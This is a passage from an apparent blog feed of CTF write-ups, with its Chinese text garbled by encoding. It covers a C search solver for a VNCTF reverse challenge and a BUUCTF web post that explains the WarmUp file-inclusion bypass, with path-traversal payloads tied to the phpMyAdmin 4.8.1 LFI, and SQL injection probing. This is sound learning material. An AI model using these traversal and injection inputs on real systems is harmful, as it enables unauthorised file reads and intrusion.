·çš„æ€æƒ³ï¼Œä»ç¬¬äºŒè¡Œå¼€å§‹ï¼Œå½“å‰ä¸€è¡Œçš„åŒåˆ—ä½ç½®ä¸º0æ—¶æ‰ç»§ç»­ä¸‹å»ï¼Œå¦åˆ™å°±å›æº¯ã€‚</p><p><img src="/2021/03/18/vnctf2021/image-20210424094440844.png" alt="image-20210424094440844"></p><p>è·‘äº†ä¸€ä¸‹æ”¹è¿›åçš„ï¼Œè·‘å‡ºä¸€ç»„è§£è¿˜æ˜¯å¾ˆå¿«çš„ï¼Œä½†è¦ç©·ä¸¾åæ‰¾åˆ°ç›®æ ‡è§£ï¼Œä»ç„¶è¦å¾ˆä¹…ï¼Œï¼Œä¸»è¦æ˜¯è¿™æ ·æœç´¢å¤šäº†å›æº¯çš„è¿‡ç¨‹ï¼Œ<strong>å¯¹æ¯ä¸€è¡Œè¦èµ°çš„ä½ç½®ï¼ˆå½“å‰ä¸€è¡Œçš„åŒåˆ—ä½ç½®ä¸º0ï¼‰è¿›è¡Œäº†ä¸€ä¸ªæ‰€æœ‰æƒ…å†µæœç´¢ã€‚</strong></p><p>è¿™æ ·ï¼Œä¹Ÿæ²¡æœ‰ç»§ç»­åœ¨è¿™ä¸ªæœç´¢ç®—æ³•ä¸Šç»§ç»­å»æ”¹è¿›äº†ï¼Œç»§ç»­æ”¹è¿›ä¸å°±å’Œçˆ†ç ´ä¸€æ ·äº†ã€‚ã€‚æ‰€ä»¥è¯´è¿™ç±»é—®é¢˜ï¼Œè§„æ¨¡å¤§ä»¥åï¼Œé‡‡ç”¨ç©·ä¸¾ç¬¬ä¸€è¡Œçš„æ‰€æœ‰æƒ…å†µï¼Œç„¶åæ ¹æ®ç¬¬ä¸€è¡Œæƒ…å†µä¾æ¬¡çˆ†ç ´å‡ºåé¢çš„è¡Œæ˜¯å¾ˆå¥½çš„åŠæ³•äº†ã€‚</p><p>è´´ä¸€ä¸‹æœç´¢ç®—æ³•ï¼ˆè·‘è¿‡è§„æ¨¡å°ä¸€äº›çš„ï¼Œæ˜¯å¯ä»¥çš„ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c[<span class="number">2</span>][<span class="number">5</span>]= &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;, min1 = <span class="number">999</span>, t;</span><br><span class="line"><span class="keyword">char</span> Map[<span class="number">16</span>][<span class="number">16</span>];</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">to_hex</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a &gt;= <span class="number">10</span> ? a+<span class="number">55</span>:a+<span class="number">48</span>;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">turn</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> dx = x + c[<span class="number">0</span>][i];</span><br><span class="line">        <span class="keyword">int</span> dy = y + c[<span class="number">1</span>][i];</span><br><span class="line">        <span class="keyword">if</span>(dx &lt; <span class="number">0</span> || dy &lt; <span class="number">0</span> || dx &gt;= <span class="number">16</span> || dy &gt;= <span class="number">16</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">        Map[dx][dy] ^= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">        <span class="keyword">if</span>(Map[<span class="number">15</span>][i] == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s &gt; <span class="number">107</span>)<span class="comment">//å‰ªæ </span></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(y == <span class="number">16</span>)<span class="comment">//å‰ªæ </span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span>(x &gt;= <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">    <span class="keyword">if</span>(Map[x<span class="number">-1</span>][k] != <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">y = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(x == <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(check())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x &gt;= <span class="number">1</span>)<span class="comment">//å‰ªæ </span></span><br><span class="line"><span class="keyword">if</span>(Map[x<span class="number">-1</span>][y] == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line"></span><br><span class="line"><span class="built_in">turn</span>(x, y);<span class="comment">//ç¿»è½¬ </span></span><br><span class="line"></span><br><span class="line">ans[<span class="number">2</span>*s] = to_hex(y), ans[<span class="number">2</span>*s+<span class="number">1</span>] = to_hex(x), ans[<span class="number">2</span>*s+<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(ans);</span><br><span class="line"><span class="comment">//printf("%d\n", s);</span></span><br><span class="line"></span><br><span class="line">dfs(x, y+<span class="number">1</span>, s+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">turn</span>(x, y);<span class="comment">//å›æº¯ </span></span><br><span class="line">next:</span><br><span class="line">ans[<span class="number">2</span>*s] = <span class="number">0</span>, ans[<span class="number">2</span>*s+<span class="number">1</span>] = <span class="number">0</span>, ans[<span class="number">2</span>*s+<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dfs(x, y+<span class="number">1</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;Map[i][j]);</span><br><span class="line">    dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(min1 &lt;= <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf("%d\n", min1);</span></span><br><span class="line">        <span class="comment">//puts(ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Impossible\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸºæœ¬åŠŸè¿˜æ˜¯ä¸èƒ½ä¸¢ã€‚</p><h2 id="Crackme1"><a href="#Crackme1" class="headerlink" title="Crackme1"></a>Crackme1</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å°±å¯¹å…¶ä¸­æ„Ÿè§‰æœ‰æ„æ€çš„2ä¸ªé€†å‘é¢˜åšä¸€ä¸‹è®°å½•ï¼Œä¹Ÿæ˜¯å¤ç°ï¼Œå½“æ—¶æ²¡åšå‡ºæ¥ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>webå­¦ä¹ ä¹‹åˆ·é¢˜</title>
    <link href="https://www.bxnop.cn/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/"/>
    <id>https://www.bxnop.cn/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/</id>
    <published>2021-03-12T15:15:18.000Z</published>
    <updated>2021-04-15T12:26:28.674Z</updated>
    
    <content type="html"><![CDATA[<p>ä»å„å¤„webé¢˜å­¦ä¹ ã€‚</p><a id="more"></a><h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><p>ä»æ³¨é‡Šä¸­çœ‹åˆ°source.phpï¼Œå°è¯•è®¿é—®ï¼Œè·å–æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨æºä»£ç ä¸­åˆçœ‹åˆ°äº†hint.phpï¼Œè‡ªç„¶çš„åˆå»è®¿é—®çœ‹çœ‹ã€‚æç¤ºflagåœ¨ffffllllaaaaggggæ–‡ä»¶ä¸­ï¼Œå¯æ€ä¹ˆåˆ°è¾¾å‘¢ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415134759029.png" alt="image-20210415134759029"></p><p>ç„¶åå°±æ˜¯ç»†åˆ†ææºä»£ç ï¼š</p><p>å…ˆæŸ¥ä¸€ä¸‹ä»£ç ä¸­å‡ºç°ä½†ä¸ç†Ÿæ‚‰çš„å‡½æ•°ï¼š</p><blockquote><p><strong>in_array(search, array, type)</strong></p><ul><li>æœç´¢arrayä¸­æ˜¯å¦å­˜åœ¨searchå­—ç¬¦ä¸²ã€‚å¦‚æœ <em>search</em> å‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œä¸” <em>type</em> å‚æ•°è®¾ç½®ä¸º trueï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚</li></ul><p><strong>mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string</strong></p><ul><li>å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å‰æˆ‘ä»¬å­¦è¿‡ substr() å‡½æ•°ï¼Œå®ƒåªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œå¦‚æœè¦åˆ†å‰²çš„ä¸­æ–‡æ–‡å­—åˆ™éœ€è¦ä½¿ç”¨ mb_substr()ã€‚</li></ul><p><strong>mb_strpos (haystack , needle )</strong></p><ul><li>haystackï¼šè¦è¢«æ£€æŸ¥çš„å­—ç¬¦ä¸²ï¼›needleï¼šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚æŸ¥æ‰¾å­—ç¬¦ä¸²needleåœ¨å­—ç¬¦ä¸²haystackä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ã€‚</li></ul></blockquote><p>ä¹‹ååˆ†ææºä»£ç ï¼Œå…ˆæ£€æŸ¥äº†è¾“å…¥çš„fileå‚æ•°ï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œæ˜¯å­—ç¬¦ä¸²ï¼Œä¸”é€šè¿‡äº†checkFileå‡½æ•°æ£€æŸ¥ï¼Œåˆ™å°†æˆ‘ä»¬è¾“å…¥çš„fileå‚æ•°è¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚ä»hint.phpçŸ¥é“äº†flagæ–‡ä»¶åå­—ï¼Œè¿™é‡Œåˆæœ‰includeï¼Œå…¶å®å°±å¯ä»¥å¾€æ–‡ä»¶åŒ…å«æ¼æ´è€ƒè™‘äº†ï¼Œå°†æˆ‘ä»¬çš„flagæ–‡ä»¶åŒ…å«åˆ°ç½‘é¡µä¸­ã€‚</p><p>ä»checkFileå‡½æ•°ä¸­åˆ†æçŸ¥é“ï¼Œè¦è¿”å›Trueçš„è¯ï¼Œæˆ‘ä»¬è¯·æ±‚çš„å‚æ•°å­—ç¬¦ä¸²é‡Œå¿…é¡»å¸¦æœ‰ç™½åå•çš„ä¸­çš„å­—ç¬¦ä¸²[â€˜source.phpâ€™, â€˜hint.phpâ€™]ä¸­ä¸€ä¸ªï¼Œç¬¬ä¸€æ¬¡æ˜¯ç›´æ¥æ¯”è¾ƒï¼Œç¬¬äºŒæ¬¡å–<strong>?</strong>ä¹‹å‰çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œç¬¬ä¸‰æ¬¡å°†å…¶è¿›è¡Œä¸€æ¬¡urldecodeåå†å–<strong>?</strong>ä¹‹å‰çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒã€‚è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥åŒ…å«flagæ–‡ä»¶çš„è¯ï¼Œæ˜¾ç„¶ä¸æ˜¯èµ°ä¸€ä¸ªåˆ¤æ–­äº†ã€‚</p><p>åˆæ¥è§¦webï¼Œä¸æ‡‚çš„å¾ˆå¤šï¼Œç„¶åå°±æ˜¯å»çœ‹wpå­¦ä¹ äº†ã€‚</p><p>é¦–å…ˆçœ‹åˆ°å¤§å®¶çš„åšæ³•æœ‰2ç§ï¼š</p><p>1.ç›´æ¥èµ°ç¬¬äºŒä¸ªåˆ¤æ–­ï¼Œå¼€å§‹è¾“å…¥ä¸€ä¸ªç™½åå•ä¸­çš„å­—ç¬¦ä¸²ï¼Œç„¶åæ‹¼æ¥ä¸€ä¸ªè¦ç›¸å¯¹è·¯å¾„åˆ°è¾¾flagæ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>2.èµ°ç¬¬ä¸‰ä¸ªåˆ¤æ–­ï¼ŒåŒç¬¬ä¸€ä¸ªè¾“å…¥ï¼Œä½†å¯¹hint.phpåçš„é—®å·äºŒæ¬¡urlencodeï¼Œå› ä¸ºæµè§ˆå™¨è·å–åˆ°æˆ‘ä»¬è¾“å…¥çš„å‚æ•°åä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urldecodeã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php%<span class="number">253</span>f/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ç§å†™æ³•çš„åŒºåˆ«å°±åœ¨äºæ˜¯å¦å¯¹é—®å·è¿›è¡Œurlencodeã€‚ä½†è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Œè¿™å…¶å®æ˜¯windowsä¸linuxç¯å¢ƒä¸åŒå¯¼è‡´çš„ã€‚</p><p>è¿™ä¸ªé¢˜æ¥è‡ªäºChaMd5å®‰å…¨å›¢é˜Ÿ2018å‘ç°çš„<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpmyadmin4.8.1åå°getshell</a>çš„LFIï¼Œå½“æ—¶å‘ç°è¿™ä¸ªæ¼æ´çš„ç¯å¢ƒæ˜¯windowsï¼Œè€Œè¿™ä¸ªé¢˜ç›®çš„ç¯å¢ƒæ˜¯linuxã€‚</p><p>åœ¨windowsä¸­ï¼Œ?æ˜¯ä¸€ä¸ªä¿ç•™å­—ç¬¦ï¼Œæ–‡ä»¶åä¸èƒ½åŒ…å«é—®å·ï¼Œå¦‚æœæˆ‘ä»¬çš„è·¯å¾„åŒ…å«äº†?ï¼Œè¿™å°†è¢«è§†ä¸ºä¸€ä¸ªæ— æ•ˆçš„è·¯å¾„ï¼Œæ‰€ä»¥è¦åˆ©ç”¨urlencodeå¯¹é—®å·è¿›è¡ŒäºŒæ¬¡ç¼–ç ï¼Œé¿å…åœ¨æœ€åçš„åŒ…å«è·¯å¾„ä¸­å‡ºç°?å·ï¼Œè€Œåˆåœ¨ç¬¬ä¸‰æ¬¡æ¯”è¾ƒæ—¶ç»è¿‡è§£ç åè¿›è¡Œæ¯”è¾ƒçš„æ˜¯é—®å·ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415172253830.png" alt="image-20210415172253830"></p><p>è€Œåœ¨linuxä¸­ï¼Œä¸€ä¸ªæ–‡ä»¶åä¸­æ˜¯å¯ä»¥æœ‰é—®å·çš„ã€‚</p><p>è¿™ä¸ªé¢˜ç”¨includeåŒ…å«æ—¶ï¼Œä¹Ÿæ˜¯æŠŠç¬¬ä¸€ä¸ª/ä¹‹å‰çš„å†…å®¹çœ‹åšä¸ªæ–‡ä»¶ç›®å½•äº†ã€‚å³<strong>hint.php?</strong>çœ‹æˆä¸€ä¸ªç›®å½•ã€‚</p><p>æ‰€ä»¥æœ¬é¢˜è¦æ˜¯åœ¨windowsç¯å¢ƒä¸‹çš„è¯ï¼Œå°±å¿…é¡»é€šè¿‡ç¬¬ä¸‰ä¸ªåˆ¤æ–­ï¼Œè¿›è¡ŒäºŒæ¬¡urlencodeæ‰èƒ½æ‰“é€šã€‚</p><p>æœ€åï¼Œè¿™ä¸ªincludeï¼Œå¯ä»¥è¿™æ ·æ— çº¿åŒ…å«ä¸‹å»å—ã€‚ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210415172913575.png" alt="image-20210415172913575"></p><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h3><p>ä»é¢˜ç›®åå­—å¯ä»¥çœ‹å‡ºè€ƒç‚¹æ˜¯sqlæ³¨å…¥ã€‚</p><p>é¦–å…ˆæµ‹è¯•çœ‹ä¸€ä¸‹sqlæ³¨å…¥ç±»å‹å’Œå¼•å·é—­åˆç±»å‹ï¼š<br>è¾“å…¥ç”¨æˆ·åï¼š1â€™ï¼Œå¯†ç ï¼š222ï¼Œä»æŠ¥é”™çœ‹å‡ºå•å¼•å·é—­åˆã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413221249767.png" alt="image-20210413221249767"></p><p>é—­åˆå¼•å·ï¼Œæ„é€ æ°¸çœŸå°è¯•ç™»é™†ï¼š</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413221429789.png" alt="image-20210413221429789"></p><p>ç™»å½•æˆåŠŸï¼Œç›´æ¥çœ‹åˆ°flagã€‚</p><h3 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h3><p>é¦–å…ˆï¼Œè¿˜æ˜¯æŒ‰ç…§ä¹‹å‰åšè¿‡çš„ä¸€ä¸ªsqlæ³¨å…¥å­¦åˆ°çš„ï¼Œæµ‹è¯•ä¸€ä¸‹æ˜¯å¦æœ‰æ³¨å…¥ä¸å¼•å·é—­åˆç±»å‹ã€‚</p><p>å¯ä»¥çŸ¥é“æ˜¯å•å¼•å·é—­åˆï¼š<br><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210409230543339.png" alt="image-20210409230543339"></p><p>æµ‹è¯•ä¸€ä¸‹æ•°æ®åº“ä¸å‰ç«¯æ˜¾ç¤ºçš„é€šé“ï¼šå‘ç°å¯¹ç›¸å…³æŸ¥è¯¢æŒ‡ä»¤çš„å¤§å°å†™éƒ½è¿›è¡Œäº†è¿‡æ»¤ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210409230808679.png" alt="image-20210409230808679"></p><p>ä¸ºäº†å¤šæ”¶é›†ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥å†å°è¯•ä½¿ç”¨order by æ¥è·å¾—åˆ—æ•°ï¼Œåœ¨ä»¥ç¬¬ä¸€åˆ—ä¸ç¬¬äºŒåˆ—æ’åºæ—¶æ­£å¸¸è¾“å‡ºï¼Œä½†ç¬¬ä¸‰åˆ—æŠ¥é”™ï¼Œè¯´æ˜æœ‰2åˆ—ã€‚</p><p><img src="/2021/03/12/web%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%88%B7%E9%A2%98/image-20210413183501418.png" alt="image-20210413183501418"></p><p>â€‹    